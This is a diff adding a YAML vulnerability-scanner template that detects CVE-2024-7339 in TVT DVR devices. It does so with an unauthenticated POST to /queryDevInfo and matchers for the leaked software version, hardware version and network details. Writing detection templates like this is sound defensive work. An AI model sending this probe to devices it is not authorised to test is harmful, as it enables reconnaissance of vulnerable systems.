@@ -1,0 +1,33 @@
+id: tvt-dvr-sensitive-device-info-disclosure
+info:
+  name: TVT DVR queryDevInfo Sensitive Device Information Disclosure (CVE-2024-7339)
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: information-disclosure,CVE-2024-7339
+  description: |
+    This template detects sensitive device information disclosure in TVT DVR devices via the queryDevInfo endpoint.
+
+http:
+  - raw:
+      - |
+        POST /queryDevInfo HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="utf-8" ?>
+        <request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "softwareVersion"
+          - "eth0"
+          - "hardwareVersion"
+      - type: word
+        part: header
+        words:
+          - "text/xml"
